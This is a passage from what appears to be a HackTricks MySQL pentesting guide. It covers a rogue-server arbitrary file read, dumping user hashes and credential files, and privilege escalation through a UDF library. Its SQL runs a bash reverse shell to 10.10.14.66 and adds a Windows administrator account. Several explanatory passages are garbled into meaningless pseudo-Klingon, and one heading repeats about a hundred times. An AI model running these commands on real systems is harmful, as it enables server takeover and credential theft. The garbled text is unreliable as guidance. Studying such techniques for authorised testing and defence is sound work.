# List functions
SELECT routine_name FROM information_schema.routines WHERE routine_type = 'FUNCTION';
#@ Functions not from sys. db
SELECT routine_name FROM information_schema.routines WHERE routine_type = 'FUNCTION' AND routine_schema!='sys';
```
You can see in the docs the meaning of each privilege: [https://dev.mysql.com/doc/refman/8.0/en/privileges-provided.html](https://dev.mysql.com/doc/refman/8.0/en/privileges-provided.html#priv\_execute)

### MySQL File RCE

{% content-ref url="../pentesting-web/sql-injection/mysql-injection/mysql-ssrf.md" %}
[mysql-ssrf.md](../pentesting-web/sql-injection/mysql-injection/mysql-ssrf.md)
{% endcontent-ref %}

## MySQL arbitrary read file by client

Actually, when you try to **load data local into a table** the **content of a file** the MySQL or MariaDB server asks the **client to read it** and send the content. **Then, if you can tamper a mysql client to connect to your own MySQL server, you can read arbitrary files.**\
Please notice that this is the behaviour using:
```bash
load data local infile "/etc/passwd" into table test FIELDS TERMINATED BY '\n';
```
(Notice the "local" word)\
Because without the "local" you can get:
```bash
mysql> load data infile "/etc/passwd" into table test FIELDS TERMINATED BY '\n';

ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement
```
**Initial PoC:** [**https://github.com/allyshka/Rogue-MySql-Server**](https://github.com/allyshka/Rogue-MySql-Server)\
**In this paper you can see a complete description of the attack and even how to extend it to RCE:** [**https://paper.seebug.org/1113/**](https://paper.seebug.org/1113/)\
**Here you can find an overview of the attack:** [**http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/**](http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/)

‚Äã

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

‚Äã‚Äã[**RootedCON**](https://www.rootedcon.com/) is the most relevant cybersecurity event in **Spain** and one of the most important in **Europe**. With **the mission of promoting technical knowledge**, this congress is a boiling meeting point for technology and cybersecurity professionals in every discipline.

{% embed url="https://www.rootedcon.com/" %}

## POST

### Mysql User

It will be very interesting if mysql is running as **root**:
```bash
cat /etc/mysql/mysql.conf.d/mysqld.cnf | grep -v "#" | grep "user"
systemctl status mysql 2>/dev/null | grep -o ".\{0,0\}user.\{0,50\}" | cut -d '=' -f2 | cut -d ' ' -f1
```
#### qarDaSmysqld.cnf qar

MySQL Daq 'e' vItlhutlh:

- **`user`** Daq 'e' vItlhutlh MySQL Daq 'e' vItlhutlh vaj Daq 'e' vItlhutlh.
- **`password`** MySQL Daq 'e' vItlhutlh vaj Daq 'e' vItlhutlh vaj Daq 'e' vItlhutlh.
- **`admin_address`** IP patlh Daq 'e' vItlhutlh TCP/IP qachDaq 'e' vItlhutlh.
- **`debug`** Daq 'e' vItlhutlh vaj logmeyDaq Daq 'e' vItlhutlh vaj Daq 'e' vItlhutlh.
- **`sql_warnings`** Daq 'e' vItlhutlh vaj logmeyDaq Daq 'e' vItlhutlh vaj Daq 'e' vItlhutlh.
- **`secure_file_priv`** Daq 'e' vItlhutlh vaj Daq 'e' vItlhutlh vaj Daq 'e' vItlhutlh.
```bash
# Get current user (an all users) privileges and hashes
use mysql;
select user();
select user,password,create_priv,insert_priv,update_priv,alter_priv,delete_priv,drop_priv from user;

# Get users, permissions & creds
SELECT * FROM mysql.user;
mysql -u root --password=<PASSWORD> -e "SELECT * FROM mysql.user;"

# Create user and give privileges
create user test identified by 'test';
grant SELECT,CREATE,DROP,UPDATE,DELETE,INSERT on *.* to mysql identified by 'mysql' WITH GRANT OPTION;

# Get a shell (with your permissions, usefull for sudo/suid privesc)
\! sh
```
### Privilege Escalation via library

If the **mysql server is running as root** (or a different more privileged user) you can make it execute commands. For that, you need to use **user defined functions**. And to create a user defined you will need a **library** for the OS that is running mysql.

The malicious library to use can be found inside sqlmap and inside metasploit by doing **`locate "*lib_mysqludf_sys*"`**. The **`.so`** files are **linux** libraries and the **`.dll`** are the **Windows** ones, choose the one you need.

If you **don't have** those libraries, you can either **look for them**, or download this [**linux C code**](https://www.exploit-db.com/exploits/1518) and **compile it inside the linux vulnerable machine**:
```bash
gcc -g -c raptor_udf2.c
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```
DaH jImej, library'e' vItlhutlh. Mysql vItlhutlh'e' login, 'ej 'oH 'e' vItlhutlh'e' (root?) 'ej vItlhutlh'e' 'e' vItlhutlh'e':

#### Linux
```sql
# Use a database
use mysql;
# Create a table to load the library and move it to the plugins dir
create table npn(line blob);
# Load the binary library inside the table
## You might need to change the path and file name
insert into npn values(load_file('/tmp/lib_mysqludf_sys.so'));
# Get the plugin_dir path
show variables like '%plugin%';
# Supposing the plugin dir was /usr/lib/x86_64-linux-gnu/mariadb19/plugin/
# dump in there the library
select * from npn into dumpfile '/usr/lib/x86_64-linux-gnu/mariadb19/plugin/lib_mysqludf_sys.so';
# Create a function to execute commands
create function sys_exec returns integer soname 'lib_mysqludf_sys.so';
# Execute commands
select sys_exec('id > /tmp/out.txt; chmod 777 /tmp/out.txt');
select sys_exec('bash -c "bash -i >& /dev/tcp/10.10.14.66/1234 0>&1"');
```
#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows

#### Windows
```sql
# CHech the linux comments for more indications
USE mysql;
CREATE TABLE npn(line blob);
INSERT INTO npn values(load_file('C://temp//lib_mysqludf_sys.dll'));
show variables like '%plugin%';
SELECT * FROM mysql.npn INTO DUMPFILE 'c://windows//system32//lib_mysqludf_sys_32.dll';
CREATE FUNCTION sys_exec RETURNS integer SONAME 'lib_mysqludf_sys_32.dll';
SELECT sys_exec("net user npn npn12345678 /add");
SELECT sys_exec("net localgroup Administrators npn /add");
```
### Extracting MySQL credentials from files

Inside _/etc/mysql/debian.cnf_ you can find the **plain-text password** of the user **debian-sys-maint**

### tlhIngan Hol Translation:

_/etc/mysql/debian.cnf_ vItlhutlhlaHchugh, **debian-sys-maint** lo'wI' 'e' **plain-text password** vItlhutlhlaH.
```bash
cat /etc/mysql/debian.cnf
```
**tlhIngan Hol:**

**_mysql_** **database** **login** **ghaH** **credentials** **'e'** **'e'** **'e'**.

_/var/lib/mysql/mysql/user.MYD_ **file** **'e'** **'e'** **'e'** **MySQL users** **hashes** **'e'** **'e'** **'e'** **(mysql.user** **database** **'e'** **'e'** **'e'** **extract** **'e'** **'e'** **'e'**).

**'e'** **'e'** **'e'** **extract** **'e'** **'e'** **'e'** **'e'**.
```bash
grep -oaE "[-_\.\*a-Z0-9]{3,}" /var/lib/mysql/mysql/user.MYD | grep -v "mysql_native_password"
```
### log DIvI'

`/etc/mysql/my.cnf` Daq log mysql queries enable log. 

![](<../.gitbook/assets/image (277).png>)

### QaQmey

Configuration Files

* windows \*
* config.ini
* my.ini
* windows\my.ini
* winnt\my.ini
* \<InstDir>/mysql/data/
* unix
* my.cnf
* /etc/my.cnf
* /etc/mysql/my.cnf
* /var/lib/mysql/my.cnf
* \~/.my.cnf
* /etc/my.cnf
* Command History
* \~/.mysql.history
* Log Files
* connections.log
* update.log
* common.log

## Default MySQL Database/Tables

{% tabs %}
{% tab title="information_schema" %}
ALL\_PLUGINS\
APPLICABLE\_ROLES\
CHARACTER\_SETS\
CHECK\_CONSTRAINTS\
COLLATIONS\
COLLATION\_CHARACTER\_SET\_APPLICABILITY\
COLUMNS\
COLUMN\_PRIVILEGES\
ENABLED\_ROLES\
ENGINES\
EVENTS\
FILES\
GLOBAL\_STATUS\
GLOBAL\_VARIABLES\
KEY\_COLUMN\_USAGE\
KEY\_CACHES\
OPTIMIZER\_TRACE\
PARAMETERS\
PARTITIONS\
PLUGINS\
PROCESSLIST\
PROFILING\
REFERENTIAL\_CONSTRAINTS\
ROUTINES\
SCHEMATA\
SCHEMA\_PRIVILEGES\
SESSION\_STATUS\
SESSION\_VARIABLES\
STATISTICS\
SYSTEM\_VARIABLES\
TABLES\
TABLESPACES\
TABLE\_CONSTRAINTS\
TABLE\_PRIVILEGES\
TRIGGERS\
USER\_PRIVILEGES\
VIEWS\
INNODB\_LOCKS\
INNODB\_TRX\
INNODB\_SYS\_DATAFILES\
INNODB\_FT\_CONFIG\
INNODB\_SYS\_VIRTUAL\
INNODB\_CMP\
INNODB\_FT\_BEING\_DELETED\
INNODB\_CMP\_RESET\
INNODB\_CMP\_PER\_INDEX\
INNODB\_CMPMEM\_RESET\
INNODB\_FT\_DELETED\
INNODB\_BUFFER\_PAGE\_LRU\
INNODB\_LOCK\_WAITS\
INNODB\_TEMP\_TABLE\_INFO\
INNODB\_SYS\_INDEXES\
INNODB\_SYS\_TABLES\
INNODB\_SYS\_FIELDS\
INNODB\_CMP\_PER\_INDEX\_RESET\
INNODB\_BUFFER\_PAGE\
INNODB\_FT\_DEFAULT\_STOPWORD\
INNODB\_FT\_INDEX\_TABLE\
INNODB\_FT\_INDEX\_CACHE\
INNODB\_SYS\_TABLESPACES\
INNODB\_METRICS\
INNODB\_SYS\_FOREIGN\_COLS\
INNODB\_CMPMEM\
INNODB\_BUFFER\_POOL\_STATS\
INNODB\_SYS\_COLUMNS\
INNODB\_SYS\_FOREIGN\
INNODB\_SYS\_TABLESTATS\
GEOMETRY\_COLUMNS\
SPATIAL\_REF\_SYS\
CLIENT\_STATISTICS\
INDEX\_STATISTICS\
USER\_STATISTICS\
INNODB\_MUTEXES\
TABLE\_STATISTICS\
INNODB\_TABLESPACES\_ENCRYPTION\
user\_variables\
INNODB\_TABLESPACES\_SCRUBBING\
INNODB\_SYS\_SEMAPHORE\_WAITS
{% endtab %}

{% tab title="mysql" %}
columns\_priv\
column\_stats\
db\
engine\_cost\
event\
func\
general\_log\
gtid\_executed\
gtid\_slave\_pos\
help\_category\
help\_keyword\
help\_relation\
help\_topic\
host\
index\_stats\
innodb\_index\_stats\
innodb\_table\_stats\
ndb\_binlog\_index\
plugin\
proc\
procs\_priv\
proxies\_priv\
roles\_mapping\
server\_cost\
servers\
slave\_master\_info\
slave\_relay\_log\_info\
slave\_worker\_info\
slow\_log\
tables\_priv\
table\_stats\
time\_zone\
time\_zone\_leap\_second\
time\_zone\_name\
time\_zone\_transition\
time\_zone\_transition\_type\
transaction\_registry\
user
{% endtab %}

{% tab title="performance_schema" %}
accounts\
cond\_instances\
events\_stages\_current\
events\_stages\_history\
events\_stages\_history\_long\
events\_stages\_summary\_by\_account\_by\_event\_name\
events\_stages\_summary\_by\_host\_by\_event\_name\
events\_stages\_summary\_by\_thread\_by\_event\_name\
events\_stages\_summary\_by\_user\_by\_event\_name\
events\_stages\_summary\_global\_by\_event\_name\
events\_statements\_current\
events\_statements\_history\
events\_statements\_history\_long\
events\_statements\_summary\_by\_account\_by\_event\_name\
events\_statements\_summary\_by\_digest\
events\_statements\_summary\_by\_host\_by\_event\_name\
events\_statements\_summary\_by\_program\
events\_statements\_summary\_by\_thread\_by\_event\_name\
events\_statements\_summary\_by\_user\_by\_event\_name\
events\_statements\_summary\_global\_by\_event\_name\
events\_transactions\_current\
events\_transactions\_history\
events\_transactions\_history\_long\
events\_transactions\_summary\_by\_account\_by\_event\_name\
events\_transactions\_summary\_by\_host\_by\_event\_name\
events\_transactions\_summary\_by\_thread\_by\_event\_name\
events\_transactions\_summary\_by\_user\_by\_event\_name\
events\_transactions\_summary\_global\_by\_event\_name\
events\_waits\_current\
events\_waits\_history\
events\_waits\_history\_long\
events\_waits\_summary\_by\_account\_by\_event\_name\
events\_waits\_summary\_by\_host\_by\_event\_name\
events\_waits\_summary\_by\_instance\
events\_waits\_summary\_by\_thread\_by\_event\_name\
events\_waits\_summary\_by\_user\_by\_event\_name\
events\_waits\_summary\_global\_by\_event\_name\
file\_instances\
file\_summary\_by\_event\_name\
file\_summary\_by\_instance\
global\_status\
global\_variables\
host\_cache\
hosts\
memory\_summary\_by\_account\_by\_event\_name\
memory\_summary\_by\_host\_by\_event\_name\
memory\_summary\_by\_thread\_by\_event\_name\
memory\_summary\_by\_user\_by\_event\_name\
memory\_summary\_global\_by\_event\_name\
metadata\_locks\
mutex\_instances\
objects\_summary\_global\_by\_type\
performance\_timers\
prepared\_statements\_instances\
replication\_applier\_configuration\
replication\_applier\_status\
replication\_applier\_status\_by\_coordinator\
replication\_applier\_status\_by\_worker\
replication\_connection\_configuration\
replication\_connection\_status\
replication\_group\_member\_stats\
replication\_group\_members\
rwlock\_instances\
session\_account\_connect\_attrs\
session\_connect\_attrs\
session\_status\
session\_variables\
setup\_actors\
setup\_consumers\
setup\_instruments\
setup\_objects\
setup\_timers\
socket\_instances\
socket\_summary\_by\_event\_name\
socket\_summary\_by\_instance\
status\_by\_account\
status\_by\_host\
status\_by\_thread\
status\_by\_user\
table\_handles\
table\_io\_waits\_summary\_by\_index\_usage\
table\_io\_waits\_summary\_by\_table\
table\_lock\_waits\_summary\_by\_table\
threads\
user\_variables\_by\_thread\
users\
variables\_by\_thread
{% endtab %}

{% tab title="sys" %}
host\_summary\
host\_summary\_by\_file\_io\
host\_summary\_by\_file\_io\_type\
host\_summary\_by\_stages\
host\_summary\_by\_statement\_latency\
host\_summary\_by\_statement\_type\
innodb\_buffer\_stats\_by\_schema\
innodb\_buffer\_stats\_by\_table\
innodb\_lock\_waits\
io\_by\_thread\_by\_latency\
io\_global\_by\_file\_by\_bytes\
io\_global\_by\_file\_by\_latency\
io\_global\_by\_wait\_by\_bytes\
io\_global\_by\_wait\_by\_latency\
latest\_file\_io\
memory\_by\_host\_by\_current\_bytes\
memory\_by\_thread\_by\_current\_bytes\
memory\_by\_user\_by\_current\_bytes\
memory\_global\_by\_current\_bytes\
memory\_global\_total\
metrics\
processlist
schema\_table\_statistics\
schema\_table\_statistics\_with\_buffer\
schema\_tables\_with\_full\_table\_scans\
schema\_unused\_indexes\
session\
session\_ssl\_status\
statement\_analysis\
statements\_with\_errors\_or\_warnings\
statements\_with\_full\_table\_scans\
statements\_with\_runtimes\_in\_95th\_percentile\
statements\_with\_sorting\
statements\_with\_temp\_tables\
sys\_config\
user\_summary\
user\_summary\_by\_file\_io\
user\_summary\_by\_file\_io\_type\
user\_summary\_by\_stages\
user\_summary\_by\_statement\_latency\
user\_summary\_by\_statement\_type\
version\
wait\_classes\_global\_by\_avg\_latency\
wait\_classes\_global\_by\_latency\
waits\_by\_host\_by\_latency\
waits\_by\_user\_by\_latency\
waits\_global\_by\_latency\
x$host\_summary\
x$host\_summary\_by\_file\_io\
x$host\_summary\_by\_file\_io\_type\
x$host\_summary\_by\_stages\
x$host\_summary\_by\_statement\_latency\
x$host\_summary\_by\_statement\_type\
x$innodb\_buffer\_stats\_by\_schema\
x$innodb\_buffer\_stats\_by\_table\
x$innodb\_lock\_waits\
x$io\_by\_thread\_by\_latency\
x$io\_global\_by\_file\_by\_bytes\
x$io\_global\_by\_file\_by\_latency\
x$io\_global\_by\_wait\_by\_bytes\
x$io\_global\_by\_wait\_by\_latency\
x$latest\_file\_io\
x$memory\_by\_host\_by\_current\_bytes\
x$memory\_by\_thread\_by\_current\_bytes\
x$memory\_by\_user\_by\_current\_bytes\
x$memory\_global\_by\_current\_bytes\
x$memory\_global\_total\
x$processlist\
x$ps\_digest\_95th\_percentile\_by\_avg\_us\
x$ps\_digest\_avg\_latency\_distribution\
x$ps\_schema\_table\_statistics\_io\
x$schema\_flattened\_keys\
x$schema\_index\_statistics\
x$schema\_table\_lock\_waits\
x$schema\_table\_statistics\
x$schema\_table\_statistics\_with\_buffer\
x$schema\_tables\_with\_full\_table\_scans\
x$session\
x$statement\_analysis\
x$statements\_with\_errors\_or\_warnings\
x$statements\_with\_full\_table\_scans\
x$statements\_with\_runtimes\_in\_95th\_percentile\
x$statements\_with\_sorting\
x$statements\_with\_temp\_tables\
x$user\_summary\
x$user\_summary\_by\_file\_io\
x$user\_summary\_by\_file\_io\_type\
x$user\_summary\_by\_stages\
x$user\_summary\_by\_statement\_latency\
x$user\_summary\_by\_statement\_type\
x$wait\_classes\_global\_by\_avg\_latency\
x$wait\_classes\_global\_by\_latency\
x$waits\_by\_host\_by\_latency\
x$waits\_by\_user\_by\_latency\
x$waits\_global\_by\_latency

## HackTricks Automatic Commands
```
Protocol_Name: MySql    #Protocol Abbreviation if there is one.
Port_Number:  3306     #Comma separated if there is more than one.
Protocol_Description: MySql     #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for MySql
Note: |
MySQL is a freely available open source Relational Database Management System (RDBMS) that uses Structured Query Language (SQL).

https://book.hacktricks.xyz/pentesting/pentesting-mysql

Entry_2:
Name: Nmap
Description: Nmap with MySql Scripts
Command: nmap --script=mysql-databases.nse,mysql-empty-password.nse,mysql-enum.nse,mysql-info.nse,mysql-variables.nse,mysql-vuln-cve2012-2122.nse {IP} -p 3306

Entry_3:
Name: MySql
Description: Attempt to connect to mysql server
Command: mysql -h {IP} -u {Username}@localhost

Entry_4:
Name: MySql consolesless mfs enumeration
Description: MySql enumeration without the need to run msfconsole
Note: sourced from https://github.com/carlospolop/legion
Command: msfconsole -q -x 'use auxiliary/scanner/mysql/mysql_version; set RHOSTS {IP}; set RPORT 3306; run; exit' && msfconsole -q -x 'use auxiliary/scanner/mysql/mysql_authbypass_hashdump; set RHOSTS {IP}; set RPORT 3306; run; exit' && msfconsole -q -x 'use auxiliary/admin/mysql/mysql_enum; set RHOSTS {IP}; set RPORT 3306; run; exit' && msfconsole -q -x 'use auxiliary/scanner/mysql/mysql_hashdump; set RHOSTS {IP}; set RPORT 3306; run; exit' && msfconsole -q -x 'use auxiliary/scanner/mysql/mysql_schemadump; set RHOSTS {IP}; set RPORT 3306; run; exit'

```
<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/) is the most relevant cybersecurity event in **Spain** and one of the most important in **Europe**. With **the mission of promoting technical knowledge**, this congress is a boiling meeting point for technology and cybersecurity professionals in every discipline.

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
